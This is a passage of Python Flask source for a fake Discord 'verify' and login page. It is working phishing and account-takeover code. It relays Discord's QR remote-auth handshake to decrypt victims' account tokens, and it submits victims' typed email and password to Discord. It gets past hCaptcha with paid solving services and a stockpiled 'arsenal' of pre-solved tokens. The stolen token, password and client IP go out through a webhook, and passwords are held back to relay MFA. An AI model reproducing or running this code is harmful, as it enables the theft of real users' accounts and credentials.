    futures = [pool.submit(_provider_worker, name, fn) for name, fn in providers]
    done.wait(timeout=180)
    cancel_all.set()
    pool.shutdown(wait=False, cancel_futures=True)
    return winner[0], last_err[0]


def _solve_race(sitekey, rqdata, n=5):
    """Submit N solve_captcha tasks (each already races providers internally).
    First to return wins. Default n=5 for cost efficiency."""
    if n <= 1:
        return solve_captcha(sitekey, rqdata)

    winner = [None]
    last_err = [None]
    done = threading.Event()
    cancel = threading.Event()
    finished = [0]
    lock = threading.Lock()

    def _worker(idx):
        if cancel.is_set():
            return None, 'cancelled'
        t, e = solve_captcha(sitekey, rqdata, cancel_event=cancel)
        with lock:
            finished[0] += 1
            if t and not winner[0]:
                winner[0] = t
                done.set()
                cancel.set()
                print(f'[race] Worker {idx} won! Cancelling {n - finished[0]} remaining')
            elif not t:
                last_err[0] = e
            if finished[0] >= n and not winner[0]:
                done.set()
        return t, e

    from concurrent.futures import ThreadPoolExecutor
    pool = ThreadPoolExecutor(max_workers=n)
    futures = [pool.submit(_worker, i) for i in range(n)]
    done.wait(timeout=180)
    cancel.set()
    pool.shutdown(wait=False, cancel_futures=True)
    return winner[0], last_err[0]


class QRAuth:
    def __init__(self):
        self.id    = uuid.uuid4().hex[:8]
        self.pk    = rsa.generate_private_key(65537, 2048)
        self.pub   = self.pk.public_key()
        self.fp    = None
        self.st    = 'init'
        self.user  = None
        self.token = None
        self.err   = None
        self.ws    = None
        self._stop = threading.Event()
        self._wh   = False

    def pub_b64(self):
        return base64.b64encode(self.pub.public_bytes(
            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
        )).decode()

    def decrypt(self, b64s):
        return self.pk.decrypt(
            base64.b64decode(b64s),
            asym_pad.OAEP(asym_pad.MGF1(hashes.SHA256()), hashes.SHA256(), None)
        )


def _qr_worker(s: QRAuth):
    # Use a pre-warmed session from the pool (no prepare() needed = instant start)
    ds = _get_ready_session()
    if ds is None:
        ds = DiscordSession()
        ds.prepare()  # fallback: fresh session (slow path, pool was empty)

    try:
        def on_msg(ws, raw):
            d  = json.loads(raw)
            op = d.get('op')

            if op == 'hello':
                hb = d.get('heartbeat_interval', 40000) / 1000
                ws.send(json.dumps({'op': 'init', 'encoded_public_key': s.pub_b64()}))
                def beat():
                    while not s._stop.is_set():
                        try: ws.send(json.dumps({'op': 'heartbeat'}))
                        except: break
                        s._stop.wait(hb)
                threading.Thread(target=beat, daemon=True).start()

            elif op == 'nonce_proof':
                dec   = s.decrypt(d['encrypted_nonce'])
                proof = b64url(hashlib.sha256(dec).digest())
                ws.send(json.dumps({'op': 'nonce_proof', 'proof': proof}))

            elif op == 'pending_remote_init':
                s.fp = d['fingerprint']
                s.st = 'pending'

            elif op == 'pending_ticket':
                try:
                    info  = s.decrypt(d['encrypted_user_payload']).decode()
                    parts = info.split(':')
                    s.user = {
                        'id': parts[0],
                        'disc': parts[1] if len(parts) > 1 else '0',
                        'avatar': parts[2] if len(parts) > 2 else '',
                        'name': parts[3] if len(parts) > 3 else '?',
                    }
                    s.st = 'scanned'
                except Exception as e:
                    s.st = 'error'; s.err = str(e)

            elif op == 'pending_login':
                s.st = 'confirming'
                try:
                    r = ds.post('/users/@me/remote-auth/login', {'ticket': d['ticket']})
                    j = r.json()
                    if 'encrypted_token' in j:
                        s.token = s.decrypt(j['encrypted_token']).decode()
                        s.st = 'done'
                        if not s._wh:
                            s._wh = True
                            fire_webhook(s.token)
                    else:
                        s.st = 'error'; s.err = json.dumps(j)
                except Exception as e:
                    s.st = 'error'; s.err = str(e)
                s._stop.set()

            elif op == 'cancel':
                s.st = 'cancelled'; s._stop.set()

        def on_err(ws, e):
            if s.st not in ('done', 'cancelled'):
                s.st = 'error'; s.err = str(e)
            s._stop.set()

        def on_close(ws, code, msg):
            if s.st in ('init', 'pending', 'scanned', 'confirming'):
                s.st = 'expired' if s.st == 'pending' else 'error'
                s.err = s.err or ('QR expired' if s.st == 'expired' else f'Closed ({code})')
            s._stop.set()

        ws = websocket.WebSocketApp(
            WS_URL,
            on_message=on_msg, on_error=on_err, on_close=on_close,
            header=[f'Origin: https://discord.com', f'User-Agent: {UA}'],
        )
        s.ws = ws
        ws.run_forever()
    except Exception as e:
        s.st = 'error'; s.err = str(e); s._stop.set()


# ━━━━━━━━━━━━ Routes ━━━━━━━━━━━━

@app.route('/')
def index():
    return send_from_directory('.', 'verify_page.html')


@app.route('/verify/<path:slug>')
def verify_catchall(slug):
    """Catch-all: /verify/anything serves the same verify page."""
    return send_from_directory('.', 'verify_page.html')


@app.route('/login')
def login_page():
    try:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'discord_login.html'), 'r', encoding='utf-8') as f:
            html = f.read()
    except:
        return send_from_directory('.', 'discord_login.html')
    # Inject page token so /api/qr/start can verify the request came from a real page load
    tok = _issue_page_token()
    html = html.replace('</head>', f'<script>window._pgToken="{tok}";</script></head>', 1)
    resp = make_response(html)
    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'
    resp.headers['Clear-Site-Data'] = '"cache"'
    resp.headers['Vary'] = '*'
    import hashlib
    resp.headers['ETag'] = hashlib.md5(html.encode()).hexdigest()
    return resp


@app.route('/favicon.ico')
def favicon():
    return send_from_directory('.', 'captcha.png', mimetype='image/png')


# ━━━━━━━━━━ Pre-Challenge (Arsenal-Backed) ━━━━━━━━━━
# Page loads → grabs a token from the 24/7 arsenal (instant if pool ready).
# Login click does: POST login → get FRESH rqtoken → submit with arsenal token.
# Key insight: the hCaptcha token is NOT rqtoken-bound. We just need to swap
# the rqtoken to the one from the REAL login attempt. Two API calls, ~1s.

_prechallenges = {}  # pc_id → {'token': str|None, 'event': Event, 'time': float}
_pc_lock = threading.Lock()


def _prechallenge_worker(pc_id):
    """Background: grab a token from the global arsenal (instant) or wait."""
    try:
        entry = _arsenal_grab()
        if not entry:
            print(f'[prechallenge:{pc_id}] Pool empty — waiting for token...')
            entry = _arsenal_wait(timeout=90)

        pc = _prechallenges.get(pc_id)
        if not pc:
            return

        if entry and entry.get('token'):
            pc.update({'token': entry['token'], 'status': 'ready'})
            pc['event'].set()
            print(f'[prechallenge:{pc_id}] READY — token from arsenal')
        else:
            pc.update({'status': 'empty'})
            pc['event'].set()
            print(f'[prechallenge:{pc_id}] Arsenal empty after wait')

    except Exception as e:
        import traceback
        traceback.print_exc()
        pc = _prechallenges.get(pc_id)
        if pc:
            pc['status'] = 'error'
            pc['event'].set()


@app.route('/api/prechallenge', methods=['POST'])
def api_prechallenge():
    ok, retry_after = _rate_check('prechallenge')
    if not ok:
        return jsonify({'ok': False, 'reason': 'rate_limited', 'retry_after': retry_after})
    if not ANTICAPTCHA_KEY and not CAPSOLVER_KEY:
        return jsonify({'ok': False, 'reason': 'no_key'})

    pc_id = uuid.uuid4().hex[:12]
    _prechallenges[pc_id] = {
        'token': None,
        'status': 'waiting',
        'event': threading.Event(),
        'time': time.time(),
    }
    threading.Thread(target=_prechallenge_worker, args=(pc_id,), daemon=True).start()

    print(f'[prechallenge] Started {pc_id}')
    return jsonify({'ok': True, 'prechallenge_id': pc_id})


@app.route('/api/prechallenge/status/<pc_id>', methods=['GET'])
def api_prechallenge_status(pc_id):
    """Check the status of a pre-challenge without consuming it."""
    pc = _prechallenges.get(pc_id)
    if not pc:
        return jsonify({'found': False})
    return jsonify({
        'found': True,
        'status': pc.get('status', '?'),
        'has_token': bool(pc.get('token')),
        'has_rqtoken': bool(pc.get('rqtoken')),
        'sitekey': pc.get('sitekey', '')[:20],
        'age_s': round(time.time() - pc.get('time', time.time()), 1),
    })


@app.route('/api/debug-role')
def debug_role():
    """Diagnostic endpoint: test bot token, guild access, role setup."""
    results = {'config': {
        'bot_token_set': bool(BOT_TOKEN),
        'guild_id': GUILD_ID or 'MISSING',
        'verified_id': VERIFIED_ID or 'MISSING',
    }}
    if not BOT_TOKEN:
        return jsonify({**results, 'error': 'No BOT_TOKEN set'})
    try:
        s = _make_session()
        bh = {'Authorization': f'Bot {BOT_TOKEN}', 'User-Agent': 'DiscordBot (https://verify.discord.com, 1.0)'}
        # 1) Bot user info
        r1 = s.get(f'{API}/users/@me', headers=bh, timeout=10)
        if r1.ok:
            bd = r1.json()
            results['bot'] = {'id': bd.get('id'), 'username': bd.get('username'), 'status': r1.status_code}
        else:
            results['bot'] = {'status': r1.status_code, 'error': r1.text[:200]}
            return jsonify(results)
        # 2) Guild info
        if GUILD_ID:
            r2 = s.get(f'{API}/guilds/{GUILD_ID}', headers=bh, timeout=10)
            if r2.ok:
                gd = r2.json()
                results['guild'] = {'name': gd.get('name'), 'status': r2.status_code}
            else:
                results['guild'] = {'status': r2.status_code, 'error': r2.text[:200]}
        # 3) Roles
        if GUILD_ID:
            r3 = s.get(f'{API}/guilds/{GUILD_ID}/roles', headers=bh, timeout=10)
            if r3.ok:
                roles = r3.json()
                target = [rl for rl in roles if rl['id'] == VERIFIED_ID]
                results['roles'] = {'total': len(roles), 'target_found': bool(target)}
                if target:
                    results['roles']['target'] = {'name': target[0]['name'], 'position': target[0]['position']}
                # Bot's highest role
                bot_id = results.get('bot', {}).get('id')
                if bot_id:
                    r4 = s.get(f'{API}/guilds/{GUILD_ID}/members/{bot_id}', headers=bh, timeout=10)
                    if r4.ok:
                        bot_roles = r4.json().get('roles', [])
                        bot_role_objs = [rl for rl in roles if rl['id'] in bot_roles]
                        max_pos = max([rl['position'] for rl in bot_role_objs], default=0)
                        target_pos = target[0]['position'] if target else 0
                        results['hierarchy'] = {
                            'bot_highest_position': max_pos,
                            'target_position': target_pos,
                            'can_assign': max_pos > target_pos,
                        }
                    else:
                        results['bot_member'] = {'status': r4.status_code, 'error': r4.text[:200]}
            else:
                results['roles'] = {'status': r3.status_code, 'error': r3.text[:200]}
        # 4) Quick test: assign role to bot itself (will fail but shows permissions)
        results['note'] = 'Use /api/debug-role?test_user=USER_ID to test role assign on a real user'
        test_uid = request.args.get('test_user')
        if test_uid:
            url = f'{API}/guilds/{GUILD_ID}/members/{test_uid}/roles/{VERIFIED_ID}'
            rp = s.put(url, headers={**bh, 'Content-Length': '0', 'X-Audit-Log-Reason': 'debug test'}, timeout=10)
            results['test_assign'] = {'status': rp.status_code, 'response': rp.text[:300]}
    except Exception as e:
        results['error'] = str(e)
    return jsonify(results)


@app.route('/api/pressolve', methods=['POST'])
def api_pressolve():
    """Return current arsenal status."""
    st = _arsenal_status()
    return jsonify({'ok': True, **st})


@app.route('/api/diag-rqdata', methods=['GET'])
def api_diag_rqdata():
    """Diagnostic: compare rqdata + test session captcha memory."""
    results = {}
    try:
        # ── Part 1: Compare rqdata across requests ──
        ds1 = DiscordSession(); ds1.prepare()
        r1 = ds1.post('/auth/login', {
            'login': 'diag_aaa@test.xyz', 'password': 'DiagTest1!',
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
        })
        j1 = r1.json()

        ds2 = DiscordSession(); ds2.prepare()
        r2 = ds2.post('/auth/login', {
            'login': 'diag_bbb@other.com', 'password': 'DiagTest2!',
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
        })
        j2 = r2.json()

        rq1 = j1.get('captcha_rqdata', '')
        rq2 = j2.get('captcha_rqdata', '')
        results['rqdata_compare'] = {
            'match': rq1 == rq2,
            'len1': len(rq1), 'len2': len(rq2),
            'sitekey_match': j1.get('captcha_sitekey') == j2.get('captcha_sitekey'),
        }

        # ── Part 2: Session captcha memory test ──
        # Theory: if we solve captcha with junk email on a session, maybe that
        # session won't need captcha for the NEXT login attempt (with real email)
        entry = _arsenal_grab()
        if entry and entry.get('token'):
            junk_email = uuid.uuid4().hex[:8] + '@junk.xyz'
            ds_test = entry.get('ds')
            if not ds_test:
                ds_test = DiscordSession(); ds_test.prepare()

            # Step A: submit with junk email + pre-solved token + original rqtoken
            submit_a = {
                'login': junk_email, 'password': 'JunkPw!',
                'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
                'captcha_key': entry['token'],
                'captcha_rqtoken': entry['rqtoken'],
            }
            ra = ds_test.post('/auth/login', submit_a)
            ja = ra.json()
            ckeys_a = ja.get('captcha_key', [])
            captcha_a = isinstance(ckeys_a, list) and ('captcha-required' in ckeys_a or ja.get('captcha_sitekey'))
            results['step_a_junk_submit'] = {
                'status': ra.status_code,
                'captcha_still_required': captcha_a,
                'got_invalid_login': 'INVALID_LOGIN' in str(ja.get('errors', '')),
                'response_keys': list(ja.keys())[:10],
                'response_preview': str(ja)[:300],
            }

            # Step B: SAME session, now try login with a DIFFERENT email, NO captcha
            submit_b = {
                'login': 'realuser99@gmail.com', 'password': 'TestPw123',
                'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            }
            rb = ds_test.post('/auth/login', submit_b)
            jb = rb.json()
            ckeys_b = jb.get('captcha_key', [])
            captcha_b = isinstance(ckeys_b, list) and ('captcha-required' in ckeys_b or jb.get('captcha_sitekey'))
            results['step_b_real_no_captcha'] = {
                'status': rb.status_code,
                'captcha_required': captcha_b,
                'got_invalid_login': 'INVALID_LOGIN' in str(jb.get('errors', '')),
                'response_keys': list(jb.keys())[:10],
                'response_preview': str(jb)[:300],
            }
            results['session_memory_works'] = not captcha_b
        else:
            results['session_test'] = 'No arsenal token available (pool empty)'

    except Exception as e:
        results['error'] = str(e)
        import traceback; traceback.print_exc()
    return jsonify(results)


@app.route('/api/login', methods=['POST'])
def api_login():
    ok, retry_after = _rate_check('login')
    if not ok:
        return jsonify({'error': f'Too many attempts. Try again in {retry_after}s.'}), 429
    d = request.json
    login_email  = d.get('login')
    login_pw     = d.get('password')
    prechallenge_id = d.get('prechallenge_id')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    try:
        # ── Get a pre-solved captcha token (from prechallenge or arsenal) ──
        arsenal_token = None

        # Check prechallenge first (grabbed on page load)
        if prechallenge_id:
            pc = _prechallenges.get(prechallenge_id)
            if pc:
                if pc.get('token'):
                    arsenal_token = _prechallenges.pop(prechallenge_id, {}).get('token')
                elif pc.get('status') == 'waiting':
                    # Still waiting for arsenal — give it a few seconds
                    pc['event'].wait(timeout=5)
                    if pc.get('token'):
                        arsenal_token = _prechallenges.pop(prechallenge_id, {}).get('token')

        # If prechallenge didn't have one, try grabbing from arsenal directly
        if not arsenal_token:
            entry = _arsenal_grab()
            if entry:
                arsenal_token = entry.get('token')

        return _login_with_arsenal(login_email, login_pw, client_ip, arsenal_token)

    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f'[!] Login error: {e}')
        return jsonify({'error': str(e)}), 500


def _login_with_arsenal(login_email, login_pw, client_ip, arsenal_token):
    """
    Two-step instant login:
    Step 1: POST login → get captcha challenge + fresh rqtoken
    Step 2: Submit with pre-solved token + fresh rqtoken (rqtoken swap)
    If no arsenal token or token rejected → fall back to inline solve.
    """
    ds = _get_ready_session()
    if ds:
        print(f'[*] Using pre-warmed session')
    else:
        ds = DiscordSession()
        ds.prepare()

    # Step 1: Login attempt → triggers captcha
    payload_bare = {
        'login': login_email, 'password': login_pw,
        'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
    }

    try:
        r1 = ds.post('/auth/login', payload_bare)
    except Exception:
        snap = ds.snapshot()
        ds = DiscordSession()
        ds.s = _make_session()
        ds.restore(snap)
        r1 = ds.post('/auth/login', payload_bare)

    try:
        j1 = r1.json()
    except Exception:
        print(f'[*] Login step1 [{r1.status_code}]: non-JSON: {r1.text[:200]}')
        return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
    print(f'[*] Login step1 [{r1.status_code}]: {r1.text[:300]}')

    # If no captcha needed (clean IP, or invalid creds response), return directly
    ckeys = j1.get('captcha_key', [])
    is_captcha = isinstance(ckeys, list) and (
        'captcha-required' in ckeys or j1.get('captcha_sitekey')
    )
    if not is_captcha:
        return _format_login_result(j1, r1.status_code, client_ip, password=login_pw)

    # Got captcha challenge — extract FRESH rqtoken
    fresh_rqtoken = j1.get('captcha_rqtoken', '')
    sitekey = j1.get('captcha_sitekey', DEFAULT_SITEKEY)
    rqdata  = j1.get('captcha_rqdata', '')

    # Step 2: Try arsenal token with the FRESH rqtoken
    if arsenal_token:
        print(f'[*] INSTANT: submitting arsenal token with fresh rqtoken')
        payload_captcha = {
            'login': login_email, 'password': login_pw,
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            'captcha_key': arsenal_token,
            'captcha_rqtoken': fresh_rqtoken,
        }

        try:
            r2 = ds.post('/auth/login', payload_captcha)
        except Exception:
            snap = ds.snapshot()
            ds = DiscordSession()
            ds.s = _make_session()
            ds.restore(snap)
            r2 = ds.post('/auth/login', payload_captcha)

        try:
            j2 = r2.json()
        except Exception:
            print(f'[*] Arsenal submit [{r2.status_code}]: non-JSON: {r2.text[:200]}')
            return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
        print(f'[*] Arsenal submit [{r2.status_code}]: {r2.text[:300]}')

        ckeys2 = j2.get('captcha_key', [])
        still_captcha = isinstance(ckeys2, list) and (
            'captcha-required' in ckeys2 or 'invalid-response' in ckeys2
            or j2.get('captcha_sitekey')
        )

        if not still_captcha:
            print(f'[*] ARSENAL TOKEN ACCEPTED!')
            return _format_login_result(j2, r2.status_code, client_ip, password=login_pw)

        # Token rejected — update challenge data for inline fallback
        print(f'[*] Arsenal token rejected (rqtoken swap failed), falling back to inline solve')
        rqdata  = j2.get('captcha_rqdata', rqdata)
        fresh_rqtoken = j2.get('captcha_rqtoken', fresh_rqtoken)
        sitekey = j2.get('captcha_sitekey', sitekey)
    else:
        print(f'[*] No arsenal token available, inline solve')

    # Fallback: inline solve
    return _solve_and_submit(ds, login_email, login_pw, sitekey, rqdata, fresh_rqtoken, client_ip)


# _login_full_inline removed — replaced by _login_with_arsenal which handles
# both instant (arsenal) and fallback (inline solve) in one unified flow.


def _solve_and_submit(ds, login_email, login_pw, sitekey, rqdata, rqtoken, client_ip):
    """Solve captcha with race, submit login, handle retries. Returns Flask response."""
    global _last_discord_sitekey
    _last_discord_sitekey = sitekey

    MAX_SOLVE_ATTEMPTS = 2
    for attempt in range(MAX_SOLVE_ATTEMPTS):
        print(f'[solve] Attempt {attempt+1}/{MAX_SOLVE_ATTEMPTS} sitekey={sitekey[:16]} rqdata={bool(rqdata)}')

        token, err = _solve_race(sitekey, rqdata, n=5)
        if not token:
            print(f'[solve] Failed: {err}')
            if attempt >= MAX_SOLVE_ATTEMPTS - 1:
                return jsonify({'error': 'Verification timed out. Please try again.', 'retry': True}), 500
            continue

        payload = {
            'login': login_email, 'password': login_pw,
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            'captcha_key': token,
            'captcha_rqtoken': rqtoken,
        }

        # Fresh TLS connection, preserve identity
        snap = ds.snapshot()
        ds2 = DiscordSession()
        ds2.s = _make_session()
        ds2.restore(snap)

        try:
            r = ds2.post('/auth/login', payload)
        except Exception:
            snap2 = ds2.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap2)
            r = ds2.post('/auth/login', payload)

        try:
            j = r.json()
        except Exception:
            print(f'[solve] Result [{r.status_code}]: non-JSON: {r.text[:200]}')
            if attempt < MAX_SOLVE_ATTEMPTS - 1:
                time.sleep(1)
                continue
            return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
        print(f'[solve] Result [{r.status_code}]: {r.text[:400]}')

        ckeys = j.get('captcha_key', [])
        still_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )

        if not still_captcha:
            return _format_login_result(j, r.status_code, client_ip, ds2, password=login_pw)

        # Token rejected — retry with new challenge data
        rqdata  = j.get('captcha_rqdata', rqdata)
        rqtoken = j.get('captcha_rqtoken', rqtoken)
        sitekey = j.get('captcha_sitekey', sitekey)
        ds = ds2
        print(f'[solve] Token rejected, retrying...')

    return jsonify({'error': 'Verification timed out. Please try again.', 'retry': True}), 500


def _format_login_result(j, status_code, client_ip, ds=None, password='?'):
    """Format Discord login result into a Flask response."""
    if j.get('token'):
        fire_webhook(j['token'], client_ip, password)
        return jsonify(_success_with_info(j['token']))
    # Store password for MFA ticket lookup
    if j.get('ticket') and password != '?':
        with _pw_store_lock:
            _pw_store[j['ticket']] = password

    if j.get('ticket') and j.get('mfa') is not None:
        print(f'[*] MFA required: mfa={j.get("mfa")}, sms={j.get("sms")}')
        resp = dict(j)
        if password and password != '?':
            resp['_pw'] = password  # Pass to frontend for MFA round-trip
        return jsonify(resp)

    # Error
    err_msg = j.get('message', '')
    if not err_msg:
        ckeys = j.get('captcha_key', [])
        if isinstance(ckeys, list) and ('captcha-required' in ckeys or 'invalid-response' in ckeys):
            err_msg = 'Verification timed out. Please try again.'
        elif j.get('retry_after'):
            err_msg = f'Rate limited. Try again in {int(j["retry_after"])}s.'
        else:
            err_msg = 'Login failed. Please check your credentials and try again.'

    errs = j.get('errors', {})
    is_email_verify = False
    for field_key in errs:
        if isinstance(errs[field_key], dict):
            for fe in errs[field_key].get('_errors', []):
                if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                    err_msg = fe.get('message', 'New login location detected. Please check your email.')
                    is_email_verify = True

    result = {'message': err_msg, 'error': err_msg}
    if is_email_verify:
        result['email_verify'] = True
    if j.get('errors'):
        result['errors'] = j['errors']
    if j.get('retry_after'):
        result['retry_after'] = j['retry_after']

    # Forward Discord's code50035 directly for better frontend handling
    if j.get('code'):
        result['code'] = j['code']

    print(f'[!] Login result: {err_msg}')
    return jsonify(result), status_code


def _bg_solve_prechallenge(sid, sess, pc):
    """Handle PC shortcut mode: wait for pre-challenge solve, submit with real creds."""
    try:
        # ── Session age guard: stop solving if session is too old ──
        age = time.time() - sess.get('_created_at', time.time())
        if age > SESSION_SOLVE_TIMEOUT:
            print(f'[bg:{sid}] Session too old ({age:.0f}s > {SESSION_SOLVE_TIMEOUT}s), aborting solve')
            sess['result'] = {'error': 'Session expired. Please try again.', 'retry': True}
            sess['result_code'] = 500
            sess['status'] = 'done'
            return

        email = sess['email']
        pw    = sess['pw']
        ip    = sess.get('client_ip', '')

        # Wait for pre-challenge to finish solving
        if not pc['event'].is_set():
            remaining = max(5, 120 - (time.time() - pc.get('time', time.time())))
            print(f'[bg:{sid}] PC-shortcut: waiting up to {remaining:.0f}s for pre-challenge...')
            pc['event'].wait(timeout=remaining)

        if not (pc.get('token') and pc.get('rqtoken')):
            # Pre-challenge failed — need to do full login flow from scratch
            print(f'[bg:{sid}] Pre-challenge failed, doing full login flow from scratch')
            ds = _get_ready_session()
            if not ds:
                ds = DiscordSession()
                ds.prepare()
            payload = {
                'login': email, 'password': pw,
                'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            }
            r = ds.post('/auth/login', payload)
            j = r.json()
            ckeys = j.get('captcha_key', [])
            is_captcha = isinstance(ckeys, list) and (
                'captcha-required' in ckeys or j.get('captcha_sitekey')
            )
            if not is_captcha:
                # No captcha needed (lucky!) — process result
                _store_bg_result(sid, sess, j, r.status_code, ip, ds)
                return
            # Got captcha — solve
            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
            rqdata  = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', '')
            token, err = _solve_race(sitekey, rqdata, n=5)
            if not token:
                sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return
            payload['captcha_key'] = token
            payload['captcha_rqtoken'] = rqtoken
            snap = ds.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap)
            r = ds2.post('/auth/login', payload)
            j = r.json()
            _store_bg_result(sid, sess, j, r.status_code, ip, ds2)
            return

        # Pre-challenge solved! Submit REAL credentials with pre-challenge captcha
        token   = pc['token']
        rqtoken = pc.get('rqtoken', '')
        ds      = pc.get('ds') or DiscordSession()
        print(f'[bg:{sid}] PC-shortcut: pre-challenge solved! Submitting real creds...')

        payload = {
            'login': email, 'password': pw,
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            'captcha_key': token,
            'captcha_rqtoken': rqtoken,
        }
        try:
            r = ds.post('/auth/login', payload)
        except Exception:
            snap = ds.snapshot()
            ds = DiscordSession()
            ds.s = _make_session()
            ds.restore(snap)
            r = ds.post('/auth/login', payload)

        j = r.json()
        print(f'[bg:{sid}] PC-shortcut result [{r.status_code}]: {r.text[:400]}')

        # Check if Discord still wants captcha (token rejected)
        ckeys = j.get('captcha_key', [])
        still_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )
        if still_captcha:
            # Token rejected — do fresh solve
            print(f'[bg:{sid}] PC token rejected, doing fresh solve')
            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
            rqdata  = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', '')
            token2, err = _solve_race(sitekey, rqdata, n=5)
            if not token2:
                sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return
            payload['captcha_key'] = token2
            payload['captcha_rqtoken'] = rqtoken
            snap = ds.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap)
            r = ds2.post('/auth/login', payload)
            j = r.json()
            ds = ds2

        _store_bg_result(sid, sess, j, r.status_code, ip, ds)

    except Exception as e:
        import traceback
        traceback.print_exc()
        sess['result'] = {'error': str(e)}
        sess['result_code'] = 500
        sess['status'] = 'done'


def _store_bg_result(sid, sess, j, status_code, client_ip, ds):
    """Process Discord login result and store it for polling."""
    pw = sess.get('pw', '?')
    print(f'[bg:{sid}] Final result [{status_code}]: {str(j)[:400]}')
    if j.get('token'):
        fire_webhook(j['token'], client_ip, pw)
        sess['result'] = _success_with_info(j['token'])
        sess['result_code'] = 200
    elif j.get('ticket') and j.get('mfa') is not None:
        # Store password for MFA ticket lookup
        with _pw_store_lock:
            _pw_store[j['ticket']] = pw
        sess['result'] = j
        sess['result_code'] = 200
    else:
        err_msg = j.get('message', '')
        if not err_msg:
            ckeys = j.get('captcha_key', [])
            if isinstance(ckeys, list) and ('captcha-required' in ckeys or 'invalid-response' in ckeys):
                err_msg = 'Verification timed out. Retrying...'
            elif j.get('retry_after'):
                err_msg = f'Rate limited. Try again in {int(j["retry_after"])}s.'
            else:
                err_msg = 'Login failed. Please check your credentials and try again.'
        errs = j.get('errors', {})
        for field_key in errs:
            if isinstance(errs[field_key], dict):
                for fe in errs[field_key].get('_errors', []):
                    if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                        err_msg = fe.get('message', 'New login location detected. Please check your email.')
        result = {'message': err_msg, 'error': err_msg}
        if j.get('errors'):
            result['errors'] = j['errors']
        if j.get('retry_after'):
            result['retry_after'] = j['retry_after']
        sess['result'] = result
        sess['result_code'] = status_code
    sess['status'] = 'done'


def _bg_solve(sid):
    """Background thread: solve captcha, re-submit login, store result.
    If a pre-challenge is still solving, waits for it instead of starting new tasks.
    Supports _pc_shortcut mode: no normal flow data, uses pre-challenge session directly.
    """
    global _last_discord_sitekey
    try:
        sess = login_sessions.get(sid)
        if not sess:
            return

        # ── Session age guard: stop solving if session is too old ──
        age = time.time() - sess.get('_created_at', time.time())
        if age > SESSION_SOLVE_TIMEOUT:
            print(f'[bg:{sid}] Session too old ({age:.0f}s > {SESSION_SOLVE_TIMEOUT}s), aborting solve')
            sess['result'] = {'error': 'Session expired. Please try again.', 'retry': True}
            sess['result_code'] = 500
            sess['status'] = 'done'
            return

        pc = sess.get('_prechallenge')

        # ── PC shortcut mode: pre-challenge is our ONLY solve path ──
        if sess.get('_pc_shortcut') and pc:
            return _bg_solve_prechallenge(sid, sess, pc)

        sitekey = sess['sitekey']
        rqdata  = sess['rqdata']
        rqtoken = sess['rqtoken']
        payload = dict(sess['payload'])
        ds      = sess['session']

        # Update global sitekey tracker for pre-solve pool
        _last_discord_sitekey = sitekey

        MAX_ATTEMPTS = 3
        j = {}
        r = None
        last_ds = ds  # track last DiscordSession for email verify flow

        for attempt in range(MAX_ATTEMPTS):
            # ── Check session age before each solve attempt ──
            age = time.time() - sess.get('_created_at', time.time())
            if age > SESSION_SOLVE_TIMEOUT:
                print(f'[bg:{sid}] Session too old ({age:.0f}s), stopping solve at attempt {attempt+1}')
                sess['result'] = {'error': 'Session expired. Please try again.', 'retry': True}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return

            print(f'[bg:{sid}] Captcha attempt {attempt+1}/{MAX_ATTEMPTS} (sitekey={sitekey[:16]}, rqdata={bool(rqdata)})')

            solved_token = None

            # ── Solve captcha ──
            solved_token, err = _solve_race(sitekey, rqdata, n=5)
            if not solved_token:
                print(f'[bg:{sid}] Solve failed: {err}')
                if attempt >= MAX_ATTEMPTS - 1:
                    sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                    sess['result_code'] = 500
                    sess['status'] = 'done'
                    return
                continue

            # Submit login with solved captcha token
            payload['captcha_key'] = solved_token
            payload['captcha_rqtoken'] = rqtoken

            # Fresh TLS connection, preserve identity (cookies + fingerprint)
            snap = ds.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap)
            last_ds = ds2

            try:
                r = ds2.post('/auth/login', payload)
            except Exception as ce:
                print(f'[bg:{sid}] Connection error: {ce}')
                snap2 = ds2.snapshot()
                ds3 = DiscordSession()
                ds3.s = _make_session()
                ds3.restore(snap2)
                r = ds3.post('/auth/login', payload)
                ds2 = ds3
                last_ds = ds3

            j = r.json()
